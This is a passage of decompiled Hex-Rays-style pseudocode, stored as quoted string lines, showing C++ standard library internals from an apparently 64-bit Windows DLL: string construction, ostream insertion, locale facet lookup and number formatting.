    "    v6 = *(_QWORD *)(v5 + *(_QWORD *)(v7 + 16));",
    "LABEL_12:",
    "    if ( v6 )",
    "      goto LABEL_17;",
    "  }",
    "  if ( v2 )",
    "  {",
    "    v6 = v2;",
    "  }",
    "  else",
    "  {",
    "    if ( sub_180001B00(&v11, a1) == -1 )",
    "      Concurrency::cancel_current_task();",
    "    v6 = v11;",
    "    sub_180010180(v11);",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v6 + 8LL))(v6);",
    "    qword_18004DE60 = v6;",
    "  }",
    "LABEL_17:",
    "  sub_18000FCE8(v10);",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180009A40(__int64 a1, int a2)",
    "{",
    "  unsigned __int64 v2; // r14",
    "  _BYTE *v3; // rdi",
    "  unsigned int v4; // r8d",
    "  unsigned int v6; // r8d",
    "  __int64 v7; // rbp",
    "  unsigned __int64 v8; // rsi",
    "  unsigned __int64 v9; // rax",
    "  __int64 v10; // rax",
    "  unsigned __int64 v11; // rcx",
    "  _BYTE v13[3]; // [rsp+45h] [rbp-23h] BYREF",
    "",
    "  v2 = 0;",
    "  v3 = v13;",
    "  v4 = a2;",
    "  if ( a2 >= 0 )",
    "  {",
    "    do",
    "    {",
    "      *--v3 = v4 % 0xA + 48;",
    "      v4 /= 0xAu;",
    "    }",
    "    while ( v4 );",
    "  }",
    "  else",
    "  {",
    "    v6 = -a2;",
    "    do",
    "    {",
    "      *--v3 = v6 % 0xA + 48;",
    "      v6 /= 0xAu;",
    "    }",
    "    while ( v6 );",
    "    *--v3 = 45;",
    "  }",
    "  *(_OWORD *)a1 = 0;",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 24) = 0;",
    "  if ( v3 != v13 )",
    "  {",
    "    v7 = 0x7FFFFFFFFFFFFFFFLL;",
    "    v8 = v13 - v3;",
    "    if ( (unsigned __int64)(v13 - v3) > 0x7FFFFFFFFFFFFFFFLL )",
    "      std::vector<void *>::_Xlen();",
    "    if ( v8 <= 0xF )",
    "    {",
    "      *(_QWORD *)(a1 + 16) = v8;",
    "      *(_QWORD *)(a1 + 24) = 15;",
    "      sub_180036160(a1, v3, v13 - v3);",
    "      *(_BYTE *)(v8 + a1) = 0;",
    "      return a1;",
    "    }",
    "    if ( (v8 | 0xF) <= 0x7FFFFFFFFFFFFFFFLL )",
    "    {",
    "      v7 = v8 | 0xF;",
    "      if ( (v8 | 0xF) < 0x16 )",
    "        v7 = 22;",
    "      v11 = v7 + 1;",
    "      if ( v7 == -1 )",
    "        goto LABEL_22;",
    "      if ( v11 < 0x1000 )",
    "      {",
    "        v2 = sub_180011714(v11);",
    "LABEL_22:",
    "        *(_QWORD *)a1 = v2;",
    "        *(_QWORD *)(a1 + 16) = v8;",
    "        *(_QWORD *)(a1 + 24) = v7;",
    "        sub_180036160(v2, v3, v13 - v3);",
    "        *(_BYTE *)(v2 + v8) = 0;",
    "        return a1;",
    "      }",
    "      v9 = v7 + 40;",
    "      if ( v7 + 40 < (unsigned __int64)(v7 + 1) )",
    "        Concurrency::cancel_current_task();",
    "    }",
    "    else",
    "    {",
    "      v9 = 0x8000000000000027uLL;",
    "    }",
    "    v10 = sub_180011714(v9);",
    "    if ( !v10 )",
    "      invalid_parameter_noinfo_noreturn();",
    "    v2 = (v10 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    *(_QWORD *)(v2 - 8) = v10;",
    "    goto LABEL_22;",
    "  }",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 24) = 15;",
    "  *(_BYTE *)a1 = 0;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 *__fastcall sub_180009C20(__int64 *a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  int v6; // edi",
    "  __int64 v7; // r14",
    "  __int64 v8; // rcx",
    "  __int64 v9; // rbx",
    "  __int64 v10; // rbx",
    "  __int64 v11; // rcx",
    "  __int64 v12; // rcx",
    "  __int64 v13; // rax",
    "  bool v14; // al",
    "  __int64 v15; // rax",
    "  char v16; // dl",
    "  __int64 v17; // rcx",
    "  _QWORD *v18; // rcx",
    "  int *v19; // rdx",
    "  _QWORD *v20; // rcx",
    "  _BYTE *v21; // rdx",
    "  int v22; // eax",
    "  __int64 v23; // rcx",
    "  __int64 v24; // rcx",
    "  _QWORD *v25; // rcx",
    "  int *v26; // rdx",
    "  _QWORD *v27; // rcx",
    "  _BYTE *v28; // rdx",
    "  int v29; // eax",
    "  char *v30; // rcx",
    "  int v31; // edi",
    "  int v32; // edx",
    "  __int64 v33; // rdx",
    "  __int64 v34; // rcx",
    "  const char *v36; // rbx",
    "  __m128i *v37; // rax",
    "  bool v38; // [rsp+28h] [rbp-80h]",
    "  _QWORD v39[2]; // [rsp+30h] [rbp-78h] BYREF",
    "  _QWORD pExceptionObject[13]; // [rsp+40h] [rbp-68h] BYREF",
    "",
    "  v6 = 0;",
    "  v7 = -1;",
    "  do",
    "    ++v7;",
    "  while ( *(_BYTE *)(a2 + v7) );",
    "  v8 = *(int *)(*a1 + 4);",
    "  v9 = *(__int64 *)((char *)a1 + v8 + 40);",
    "  if ( v9 <= 0 || v9 <= v7 )",
    "    v10 = 0;",
    "  else",
    "    v10 = v9 - v7;",
    "  v11 = *(__int64 *)((char *)a1 + v8 + 72);",
    "  if ( v11 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v11 + 8LL))(v11);",
    "  v12 = *a1;",
    "  v13 = *(int *)(*a1 + 4);",
    "  if ( *(_DWORD *)((char *)a1 + v13 + 16) )",
    "  {",
    "    v14 = 0;",
    "  }",
    "  else",
    "  {",
    "    v15 = *(__int64 *)((char *)a1 + v13 + 80);",
    "    if ( !v15 || (__int64 *)v15 == a1 )",
    "    {",
    "      v14 = 1;",
    "    }",
    "    else",
    "    {",
    "      sub_180009180(v15);",
    "      v12 = *a1;",
    "      v14 = *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4) + 16) == 0;",
    "    }",
    "  }",
    "  v38 = v14;",
    "  if ( v14 )",
    "  {",
    "    if ( (*(_DWORD *)((_BYTE *)a1 + *(int *)(v12 + 4) + 24) & 0x1C0) != 0x40 )",
    "    {",
    "      while ( v10 > 0 )",
    "      {",
    "        v17 = *(int *)(*a1 + 4);",
    "        a3 = *((unsigned __int8 *)a1 + v17 + 88);",
    "        v18 = *(_QWORD **)((char *)a1 + v17 + 72);",
    "        if ( *(_QWORD *)v18[8] && (v19 = (int *)v18[11], *v19 > 0) )",
    "        {",
    "          --*v19;",
    "          v20 = (_QWORD *)v18[8];",
    "          v21 = (_BYTE *)(*v20)++;",
    "          *v21 = a3;",
    "          v22 = a3;",
    "        }",
    "        else",
    "        {",
    "          v22 = (*(__int64 (__fastcall **)(_QWORD *, _QWORD))(*v18 + 24LL))(v18, (unsigned int)a3);",
    "        }",
    "        if ( v22 == -1 )",
    "        {",
    "          v16 = 4;",
    "          v6 = 4;",
    "          goto LABEL_36;",
    "        }",
    "        --v10;",
    "      }",
    "    }",
    "    v23 = *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 72);",
    "    if ( (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v23 + 72LL))(v23, a2, v7) == v7 )",
    "    {",
    "      while ( v10 > 0 )",
    "      {",
    "        v24 = *(int *)(*a1 + 4);",
    "        a3 = *((unsigned __int8 *)a1 + v24 + 88);",
    "        v25 = *(_QWORD **)((char *)a1 + v24 + 72);",
    "        if ( *(_QWORD *)v25[8] && (v26 = (int *)v25[11], *v26 > 0) )",
    "        {",
    "          --*v26;",
    "          v27 = (_QWORD *)v25[8];",
    "          v28 = (_BYTE *)(*v27)++;",
    "          *v28 = a3;",
    "          v29 = a3;",
    "        }",
    "        else",
    "        {",
    "          v29 = (*(__int64 (__fastcall **)(_QWORD *, _QWORD))(*v25 + 24LL))(v25, (unsigned int)a3);",
    "        }",
    "        if ( v29 == -1 )",
    "          goto LABEL_34;",
    "        --v10;",
    "      }",
    "    }",
    "    else",
    "    {",
    "LABEL_34:",
    "      v6 = 4;",
    "    }",
    "    v16 = 4;",
    "LABEL_36:",
    "    *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 40) = 0;",
    "  }",
    "  else",
    "  {",
    "    v16 = 4;",
    "    v6 = 4;",
    "  }",
    "  v30 = (char *)a1 + *(int *)(*a1 + 4);",
    "  v31 = *((_DWORD *)v30 + 4) | v6;",
    "  if ( *((_QWORD *)v30 + 9) )",
    "    v16 = 0;",
    "  v32 = ((unsigned __int8)v31 | (unsigned __int8)v16) & 0x17;",
    "  *((_DWORD *)v30 + 4) = v32;",
    "  v33 = *((_DWORD *)v30 + 5) & (unsigned int)v32;",
    "  if ( (_DWORD)v33 )",
    "  {",
    "    if ( (v33 & 4) != 0 )",
    "    {",
    "      v36 = \"ios_base::badbit set\";",
    "    }",
    "    else",
    "    {",
    "      v36 = \"ios_base::failbit set\";",
    "      if ( (v33 & 2) == 0 )",
    "        v36 = \"ios_base::eofbit set\";",
    "    }",
    "    v37 = (__m128i *)unknown_libname_1(v39, 1);",
    "    sub_180001E10(pExceptionObject, (__int64)v36, v37);",
    "    throw (std::ios_base::failure *)pExceptionObject;",
    "  }",
    "  if ( !(unsigned __int8)sub_180010AB0(v30, v33, a3, a4, (_DWORD)a1, v38, v39[0], v39[1]) )",
    "    sub_1800092E0(a1);",
    "  v34 = *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 72);",
    "  if ( v34 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v34 + 16LL))(v34);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180009ED0(__int64 a1)",
    "{",
    "  __int64 v2; // rax",
    "  __int64 v3; // rdx",
    "  unsigned __int8 v4; // di",
    "  void (__fastcall ***v5)(_QWORD, __int64); // rax",
    "  _BYTE v7[8]; // [rsp+20h] [rbp-18h] BYREF",
    "  __int64 v8; // [rsp+28h] [rbp-10h]",
    "",
    "  v8 = *(_QWORD *)(*(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v8 + 8LL))();",
    "  v2 = sub_180009900((__int64)v7);",
    "  LOBYTE(v3) = 10;",
    "  v4 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v2 + 64LL))(v2, v3);",
    "  if ( v8 )",
    "  {",
    "    v5 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 16LL))(v8);",
    "    if ( v5 )",
    "      (**v5)(v5, 1);",
    "  }",
    "  sub_18000C8F0(a1, v4);",
    "  sub_180009180(a1);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180009F60(__int64 a1)",
    "{",
    "  __int64 v2; // rbp",
    "  unsigned __int64 v3; // rdi",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rsi",
    "  __int64 v6; // rbx",
    "  __int64 v7; // rax",
    "  _BYTE v9[4]; // [rsp+20h] [rbp-38h] BYREF",
    "  _BYTE v10[4]; // [rsp+24h] [rbp-34h] BYREF",
    "  __int64 v11; // [rsp+28h] [rbp-30h] BYREF",
    "",
    "  sub_18000FC70(v10, 0);",
    "  v2 = qword_18004DE58;",
    "  v11 = qword_18004DE58;",
    "  v3 = qword_18004E1E8;",
    "  if ( !qword_18004E1E8 )",
    "  {",
    "    sub_18000FC70(v9, 0);",
    "    if ( !qword_18004E1E8 )",
    "      qword_18004E1E8 = ++dword_18004C6A0;",
    "    sub_18000FCE8(v9);",
    "    v3 = qword_18004E1E8;",
    "  }",
    "  v4 = *(_QWORD *)(a1 + 8);",
    "  v5 = 8 * v3;",
    "  if ( v3 >= *(_QWORD *)(v4 + 24) )",
    "  {",
    "    v6 = 0;",
    "  }",
    "  else",
    "  {",
    "    v6 = *(_QWORD *)(v5 + *(_QWORD *)(v4 + 16));",
    "    if ( v6 )",
    "      goto LABEL_17;",
    "  }",
    "  if ( !*(_BYTE *)(v4 + 36) )",
    "    goto LABEL_12;",
    "  v7 = sub_1800101B8();",
    "  if ( v3 < *(_QWORD *)(v7 + 24) )",
    "  {",
    "    v6 = *(_QWORD *)(v5 + *(_QWORD *)(v7 + 16));",
    "LABEL_12:",
    "    if ( v6 )",
    "      goto LABEL_17;",
    "  }",
    "  if ( v2 )",
    "  {",
    "    v6 = v2;",
    "  }",
    "  else",
    "  {",
    "    if ( sub_18000C770(&v11, a1) == -1 )",
    "      Concurrency::cancel_current_task();",
    "    v6 = v11;",
    "    sub_180010180(v11);",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v6 + 8LL))(v6);",
    "    qword_18004DE58 = v6;",
    "  }",
    "LABEL_17:",
    "  sub_18000FCE8(v10);",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000A0A0(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v3; // rcx",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rsi",
    "  __int64 v6; // r13",
    "  unsigned __int64 v7; // r15",
    "  __int64 v8; // r14",
    "  __int64 v9; // rbx",
    "  __int64 v10; // rax",
    "  void (__fastcall ***v11)(_QWORD, __int64); // rax",
    "  __int64 v12; // rcx",
    "  char v13; // dl",
    "  int v14; // edx",
    "  int v15; // edx",
    "  __int64 v16; // rcx",
    "  const char *v18; // rbx",
    "  __m128i *v19; // rax",
    "  __int64 v20; // [rsp+50h] [rbp-C8h] BYREF",
    "  __int16 v21; // [rsp+58h] [rbp-C0h]",
    "  __int64 v22; // [rsp+60h] [rbp-B8h] BYREF",
    "  bool v23; // [rsp+68h] [rbp-B0h]",
    "  char v24; // [rsp+69h] [rbp-AFh]",
    "  __int64 v25; // [rsp+70h] [rbp-A8h]",
    "  __int64 v26; // [rsp+78h] [rbp-A0h]",
    "  _BYTE v28[8]; // [rsp+88h] [rbp-90h] BYREF",
    "  __int64 v29; // [rsp+90h] [rbp-88h]",
    "  _BYTE v30[16]; // [rsp+98h] [rbp-80h] BYREF",
    "  _QWORD pExceptionObject[5]; // [rsp+A8h] [rbp-70h] BYREF",
    "  int v32; // [rsp+D0h] [rbp-48h] BYREF",
    "  _BYTE v33[4]; // [rsp+D4h] [rbp-44h] BYREF",
    "  _BYTE v34[8]; // [rsp+D8h] [rbp-40h] BYREF",
    "  __int64 v35; // [rsp+E0h] [rbp-38h] BYREF",
    "",
    "  v25 = a2;",
    "  v32 = 0;",
    "  v26 = a1;",
    "  v3 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "  if ( v3 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 8LL))(v3);",
    "  if ( (unsigned __int8)sub_18000CAA0(a1, 0) )",
    "  {",
    "    v20 = 0;",
    "    v21 = 1;",
    "    v4 = *(int *)(*(_QWORD *)a1 + 4LL);",
    "    v22 = *(_QWORD *)(v4 + a1 + 72);",
    "    v23 = v22 == 0;",
    "    v24 = 0;",
    "    v5 = *(_QWORD *)(*(_QWORD *)(v4 + a1 + 64) + 8LL);",
    "    v29 = v5;",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 8LL))(v5);",
    "    sub_18000FC70(v33, 0);",
    "    v6 = qword_18004DE40;",
    "    v35 = qword_18004DE40;",
    "    v7 = qword_18004E1F8;",
    "    if ( !qword_18004E1F8 )",
    "    {",
    "      sub_18000FC70(v34, 0);",
    "      if ( !qword_18004E1F8 )",
    "        qword_18004E1F8 = ++dword_18004C6A0;",
    "      sub_18000FCE8(v34);",
    "      v7 = qword_18004E1F8;",
    "    }",
    "    v8 = 8 * v7;",
    "    if ( v7 >= *(_QWORD *)(v5 + 24) )",
    "    {",
    "      v9 = 0;",
    "    }",
    "    else",
    "    {",
    "      v9 = *(_QWORD *)(v8 + *(_QWORD *)(v5 + 16));",
    "      if ( v9 )",
    "        goto LABEL_20;",
    "    }",
    "    if ( *(_BYTE *)(v5 + 36) )",
    "    {",
    "      v10 = sub_1800101B8();",
    "      if ( v7 >= *(_QWORD *)(v10 + 24) )",
    "        goto LABEL_16;",
    "      v9 = *(_QWORD *)(v8 + *(_QWORD *)(v10 + 16));",
    "    }",
    "    if ( !v9 )",
    "    {",
    "LABEL_16:",
    "      if ( v6 )",
    "      {",
    "        v9 = v6;",
    "      }",
    "      else",
    "      {",
    "        if ( sub_18000FA50(&v35, v28) == -1 )",
    "          Concurrency::cancel_current_task();",
    "        v9 = v35;",
    "        sub_180010180(v35);",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v9 + 8LL))(v9);",
    "        qword_18004DE40 = v9;",
    "      }",
    "    }",
    "LABEL_20:",
    "    sub_18000FCE8(v33);",
    "    (*(void (__fastcall **)(__int64, _BYTE *, __int64 *, __int64 *, __int64, int *, __int64))(*(_QWORD *)v9 + 80LL))(",
    "      v9,",
    "      v30,",
    "      &v22,",
    "      &v20,",
    "      a1 + *(int *)(*(_QWORD *)a1 + 4LL),",
    "      &v32,",
    "      v25);",
    "    v11 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 16LL))(v5);",
    "    if ( v11 )",
    "      (**v11)(v11, 1);",
    "  }",
    "  v12 = a1 + *(int *)(*(_QWORD *)a1 + 4LL);",
    "  v13 = 4;",
    "  if ( *(_QWORD *)(v12 + 72) )",
    "    v13 = 0;",
    "  v14 = ((unsigned __int8)(*(_BYTE *)(v12 + 16) | v32) | (unsigned __int8)v13) & 0x17;",
    "  *(_DWORD *)(v12 + 16) = v14;",
    "  v15 = *(_DWORD *)(v12 + 20) & v14;",
    "  if ( v15 )",
    "  {",
    "    if ( (v15 & 4) != 0 )",
    "    {",
    "      v18 = \"ios_base::badbit set\";",
    "    }",
    "    else",
    "    {",
    "      v18 = \"ios_base::failbit set\";",
    "      if ( (v15 & 2) == 0 )",
    "        v18 = \"ios_base::eofbit set\";",
    "    }",
    "    v19 = (__m128i *)unknown_libname_1(v30, 1);",
    "    sub_180001E10(pExceptionObject, (__int64)v18, v19);",
    "    throw (std::ios_base::failure *)pExceptionObject;",
    "  }",
    "  v16 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "  if ( v16 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v16 + 16LL))(v16);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000A3D0(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3)",
    "{",
    "  __int64 v3; // rbp",
    "  __int64 result; // rax",
    "  unsigned __int64 v8; // rax",
    "  __int64 v9; // rax",
    "  unsigned __int64 v10; // rdi",
    "  unsigned __int64 v11; // rcx",
    "",
    "  v3 = 0x7FFFFFFFFFFFFFFFLL;",
    "  if ( a3 > 0x7FFFFFFFFFFFFFFFLL )",
    "    std::vector<void *>::_Xlen();",
    "  if ( a3 <= 0xF )",
    "  {",
    "    a1[2] = a3;",
    "    a1[3] = 15;",
    "    result = sub_180036160(a1, a2, a3);",
    "    *((_BYTE *)a1 + a3) = 0;",
    "    return result;",
    "  }",
    "  if ( (a3 | 0xF) > 0x7FFFFFFFFFFFFFFFLL )",
    "  {",
    "    v8 = 0x8000000000000027uLL;",
    "LABEL_6:",
    "    v9 = sub_180011714(v8);",
    "    if ( !v9 )",
    "      invalid_parameter_noinfo_noreturn();",
    "    v10 = (v9 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    *(_QWORD *)(v10 - 8) = v9;",
    "    goto LABEL_16;",
    "  }",
    "  v3 = a3 | 0xF;",
    "  if ( (a3 | 0xF) < 0x16 )",
    "    v3 = 22;",
    "  v11 = v3 + 1;",
    "  if ( v3 == -1 )",
    "  {",
    "    v10 = 0;",
    "  }",
    "  else",
    "  {",
    "    if ( v11 >= 0x1000 )",
    "    {",
    "      v8 = v3 + 40;",
    "      if ( v3 + 40 < (unsigned __int64)(v3 + 1) )",
    "        Concurrency::cancel_current_task();",
    "      goto LABEL_6;",
    "    }",
    "    v10 = sub_180011714(v11);",
    "  }",
    "LABEL_16:",
    "  *a1 = v10;",
    "  a1[2] = a3;",
    "  a1[3] = v3;",
    "  result = sub_180036160(v10, a2, a3);",
    "  *(_BYTE *)(a3 + v10) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "_OWORD *sub_18000A4D0(",
    "        _DWORD a1,",
    "        _OWORD *a2,",
    "        __int128 *a3,",
    "        __int64 a4,",
    "        unsigned __int8 a5,",
    "        _BYTE *a6,",
    "        unsigned __int64 a7,",
    "        char a8,",
    "        ...)",
    "{",
    "  __int64 v9; // r13",
    "  const char *v10; // rdx",
    "  __int64 v11; // r12",
    "  unsigned __int64 v12; // rdi",
    "  __int64 v13; // r15",
    "  void (__fastcall ***v14)(_QWORD, __int64); // rax",
    "  _QWORD *v15; // r9",
    "  __int64 v16; // rbx",
    "  void (__fastcall ***v17)(_QWORD, __int64); // rax",
    "  __int64 v18; // rdx",
    "  __int64 v19; // r9",
    "  char v20; // r15",
    "  char v21; // cl",
    "  _QWORD *v22; // rax",
    "  char *v23; // rsi",
    "  char i; // al",
    "  unsigned __int64 v25; // rcx",
    "  unsigned __int64 v26; // r8",
    "  _QWORD *v27; // rbx",
    "  char *v28; // rbx",
    "  unsigned __int64 v29; // r12",
    "  __int64 v30; // rdi",
    "  unsigned __int64 v31; // rdi",
    "  int v32; // eax",
    "  __int128 v33; // xmm0",
    "  __int64 v34; // rbx",
    "  int *v35; // rcx",
    "  unsigned __int8 **v36; // rcx",
    "  unsigned __int8 *v37; // rdx",
    "  int v38; // eax",
    "  unsigned __int8 *v39; // rsi",
    "  __int64 v40; // r15",
    "  __int64 v41; // rbx",
    "  int v42; // r8d",
    "  int *v43; // rcx",
    "  _BYTE **v44; // rcx",
    "  _BYTE *v45; // rdx",
    "  int v46; // eax",
    "  __int64 v47; // r15",
    "  unsigned __int8 *v48; // rsi",
    "  __int64 v49; // rbx",
    "  int v50; // r8d",
    "  int *v51; // rcx",
    "  _BYTE **v52; // rcx",
    "  _BYTE *v53; // rdx",
    "  int v54; // eax",
    "  __int64 v55; // rbx",
    "  int *v56; // rcx",
    "  unsigned __int8 **v57; // rcx",
    "  unsigned __int8 *v58; // rdx",
    "  int v59; // eax",
    "  __int128 *v60; // rax",
    "  unsigned __int8 *v61; // rsi",
    "  __int64 v62; // r15",
    "  __int64 v63; // rbx",
    "  int v64; // r8d",
    "  int *v65; // rcx",
    "  _BYTE **v66; // rcx",
    "  _BYTE *v67; // rdx",
    "  int v68; // eax",
    "  __int128 v69; // xmm0",
    "  _QWORD *v70; // rsi",
    "  unsigned __int8 *v71; // rsi",
    "  __int64 v72; // r12",
    "  __int64 v73; // rbx",
    "  int v74; // r8d",
    "  int *v75; // rcx",
    "  _BYTE **v76; // rcx",
    "  _BYTE *v77; // rdx",
    "  int v78; // eax",
    "  __int64 v79; // rbx",
    "  int *v80; // rcx",
    "  unsigned __int8 **v81; // rcx",
    "  unsigned __int8 *v82; // rdx",
    "  int v83; // eax",
    "  _OWORD *v84; // rbx",
    "  __int64 v85; // rdx",
    "  __int64 v86; // rcx",
    "  unsigned __int64 v87; // rdx",
    "  __int64 v88; // rcx",
    "  __int128 v90; // [rsp+30h] [rbp-79h] BYREF",
    "  __int128 *v91; // [rsp+40h] [rbp-69h]",
    "  __int64 v92; // [rsp+48h] [rbp-61h]",
    "  _OWORD *v93; // [rsp+50h] [rbp-59h]",
    "  __int16 v94; // [rsp+58h] [rbp-51h] BYREF",
    "  _QWORD v95[2]; // [rsp+60h] [rbp-49h] BYREF",
    "  unsigned __int64 v96; // [rsp+70h] [rbp-39h]",
    "  unsigned __int64 v97; // [rsp+78h] [rbp-31h]",
    "  _QWORD v98[2]; // [rsp+80h] [rbp-29h] BYREF",
    "  __m128i si128; // [rsp+90h] [rbp-19h]",
    "",
    "  v92 = a4;",
    "  v91 = a3;",
    "  v93 = a2;",
    "  v9 = a7 && ((*a6 - 43) & 0xFD) == 0;",
    "  if ( (*(_DWORD *)(a4 + 24) & 0x3000) == 0x3000 )",
    "  {",
    "    v10 = \"pP\";",
    "    if ( v9 + 2 <= a7 && a6[v9] == 48 && ((a6[v9 + 1] - 88) & 0xDF) == 0 )",
    "      v9 += 2;",
    "  }",
    "  else",
    "  {",
    "    v10 = \"eE\";",
    "  }",
    "  v11 = sub_1800205D0(a6, v10);",
    "  v94 = 46;",
    "  LOBYTE(v94) = **(_BYTE **)sub_18001A6FC();",
    "  v12 = sub_1800205D0(a6, &v94);",
    "  *((_QWORD *)&v90 + 1) = *(_QWORD *)(*(_QWORD *)(a4 + 64) + 8LL);",
    "  (*(void (**)(void))(**((_QWORD **)&v90 + 1) + 8LL))();",
    "  v13 = sub_180009900((__int64)&v90);",
    "  if ( *((_QWORD *)&v90 + 1) )",
    "  {",
    "    v14 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(_QWORD))(**((_QWORD **)&v90 + 1) + 16LL))(*((_QWORD *)&v90 + 1));",
    "    if ( v14 )",
    "      (**v14)(v14, 1);",
    "  }",
    "  sub_180006C20((__int64)v95, a7, 0);",
    "  v15 = v95;",
    "  if ( v97 > 0xF )",
    "    v15 = (_QWORD *)v95[0];",
    "  (*(void (__fastcall **)(__int64, _BYTE *, _BYTE *, _QWORD *))(*(_QWORD *)v13 + 56LL))(v13, a6, &a6[a7], v15);",
    "  *((_QWORD *)&v90 + 1) = *(_QWORD *)(*(_QWORD *)(v92 + 64) + 8LL);",
    "  (*(void (**)(void))(**((_QWORD **)&v90 + 1) + 8LL))();",
    "  v16 = sub_18000ABA0(&v90);",
    "  if ( *((_QWORD *)&v90 + 1) )",
    "  {",
    "    v17 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(_QWORD))(**((_QWORD **)&v90 + 1) + 16LL))(*((_QWORD *)&v90 + 1));",
    "    if ( v17 )",
    "      (**v17)(v17, 1);",
    "  }",
    "  (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v16 + 40LL))(v16, v98);",
    "  v20 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v16 + 32LL))(v16);",
    "  if ( v12 != a7 )",
    "  {",
    "    v21 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v16 + 24LL))(v16);",
    "    v22 = v95;",
    "    if ( v97 > 0xF )",
    "      v22 = (_QWORD *)v95[0];",
    "    *((_BYTE *)v22 + v12) = v21;",
    "  }",
    "  if ( a8 )",
    "  {",
    "    if ( v12 == a7 )",
    "      v12 = v11;",
    "    v23 = (char *)v98;",
    "    if ( si128.m128i_i64[1] > 0xFuLL )",
    "      v23 = (char *)v98[0];",
    "    for ( i = *v23; *v23 != 127; i = *v23 )",
    "    {",
    "      if ( i <= 0 )",
    "        break;",
    "      v25 = *v23;",
    "      if ( v25 >= v12 - v9 )",
    "        break;",
    "      v12 -= v25;",
    "      v26 = v96;",
    "      if ( v96 < v12 )",
    "        std::vector<void *>::_Xlen(v25, v18, v96, v19);",
    "      if ( v97 == v96 )",
    "      {",
    "        sub_18000B070((unsigned int)v95, 1, 0, v12, 1, v20);",
    "      }",
    "      else",
    "      {",
    "        ++v96;",
    "        v27 = v95;",
    "        if ( v97 > 0xF )",
    "          v27 = (_QWORD *)v95[0];",
    "        v28 = (char *)v27 + v12;",
    "        sub_180036160(v28 + 1, v28, v26 - v12 + 1);",
    "        *v28 = v20;",
    "      }",
    "      if ( v23[1] > 0 )",
    "        ++v23;",
    "    }",
    "  }",
    "  v29 = v96;",
    "  v30 = *(_QWORD *)(v92 + 40);",
    "  if ( v30 <= 0 || v30 <= v96 )",
    "    v31 = 0;",
    "  else",
    "    v31 = v30 - v96;",
    "  v32 = *(_DWORD *)(v92 + 24) & 0x1C0;",
    "  if ( v32 == 64 )",
    "  {",
    "    v33 = *v91;",
    "    v90 = *v91;",
    "    v61 = (unsigned __int8 *)v95;",
    "    if ( v97 > 0xF )",
    "      v61 = (unsigned __int8 *)v95[0];",
    "    v62 = v9;",
    "    if ( !v9 )",
    "      goto LABEL_108;",
    "    v63 = *((_QWORD *)&v90 + 1);",
    "    do",
    "    {",
    "      v64 = *v61;",
    "      if ( !v63",
    "        || (!**(_QWORD **)(v63 + 64) || (v65 = *(int **)(v63 + 88), *v65 <= 0)",
    "          ? (v68 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v63 + 24LL))(v63, *v61))",
    "          : (--*v65, v66 = *(_BYTE ***)(v63 + 64), v67 = *v66, ++*v66, *v67 = v64, v68 = v64),",
    "            v68 == -1) )",
    "      {",
    "        LOBYTE(v90) = 1;",
    "      }",
    "      ++v61;",
    "      --v62;",
    "    }",
    "    while ( v62 );",
    "    goto LABEL_107;",
    "  }",
    "  v33 = *v91;",
    "  v90 = *v91;",
    "  if ( v32 != 256 )",
    "  {",
    "    if ( v31 )",
    "    {",
    "      v34 = *((_QWORD *)&v90 + 1);",
    "      do",
    "      {",
    "        if ( !v34",
    "          || (!**(_QWORD **)(v34 + 64) || (v35 = *(int **)(v34 + 88), *v35 <= 0)",
    "            ? (v38 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v34 + 24LL))(v34, a5))",
    "            : (--*v35, v36 = *(unsigned __int8 ***)(v34 + 64), v37 = *v36, ++*v36, *v37 = a5, v38 = a5),",
    "              v38 == -1) )",
    "        {",
    "          LOBYTE(v90) = 1;",
    "        }",
    "        --v31;",
    "      }",
    "      while ( v31 );",
    "      v33 = v90;",
    "    }",
    "    v31 = 0;",
    "    v90 = v33;",
